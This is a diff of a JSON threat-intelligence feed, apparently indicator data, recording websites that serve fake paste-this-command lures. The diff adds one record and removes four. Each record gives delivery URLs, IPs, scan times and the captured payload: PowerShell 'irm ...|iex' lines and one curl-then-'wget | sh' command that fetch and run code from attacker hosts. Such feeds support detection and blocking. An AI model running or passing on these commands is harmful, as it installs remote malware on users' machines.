@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "hazentodos.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "217.21.74.190"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/59bb7d1aaac704e0",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/59bb7d1aaac704e0'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/59bb7d1aaac704e0"
+    ],
+    "ReportId": "cmwlltm271k7m0omlj7e36c2f",
+    "ScannedAt": "2026-11-18T04:11:27.895000+00:00"
+  },
+  {
     "UrlDomain": "holyfamilymobility.ca",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -3232,94 +3254,5 @@
     ],
     "ReportId": "cmwirpftl12sp0oml5j1f82n3",
     "ScannedAt": "2026-11-16T04:32:52.387000+00:00"
-  },
-  {
-    "UrlDomain": "monnet-agency.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "91.108.98.54"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/715cc20377a87f1e",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29913390",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/715cc20377a87f1e'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/715cc20377a87f1e"
-    ],
-    "ReportId": "cmwirn29412nv0oml2psya384",
-    "ScannedAt": "2026-11-16T04:31:01.460000+00:00"
-  },
-  {
-    "UrlDomain": "tuigamer.com",
-    "DeliveryUrl": [
-      "swingerwives.com"
-    ],
-    "PayloadUrl": [
-      "https://swingerwives.com"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [],
-    "Payload": "Invoke-WebRequest \"https://swingerwives[.]com\" -OutFile $z",
-    "ResolvedDownloadUrl": [
-      "https://swingerwives.com"
-    ],
-    "ReportId": "cmwirle2v12n40omld3oq13mn",
-    "ScannedAt": "2026-11-16T04:29:43.499000+00:00"
-  },
-  {
-    "UrlDomain": "novagameit.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/webopc22/7534a6f5a9850f76"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/webopc22/7534a6f5a9850f76')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/webopc22/7534a6f5a9850f76"
-    ],
-    "ReportId": "cmwirhula12jv0omlobsquqwk",
-    "ScannedAt": "2026-11-16T04:26:58.277000+00:00"
-  },
-  {
-    "UrlDomain": "misaulas.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=7bfd64b2-7d68-42ba-b095-1277a0c08e68&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmisaulas[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A20%3A28.690Z&lastShellAt=2026-11-16T04%3A20%3A28.690Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwirbap412aj0omlforw99oo",
-    "ScannedAt": "2026-11-16T04:21:52.546000+00:00"
   }
 ]
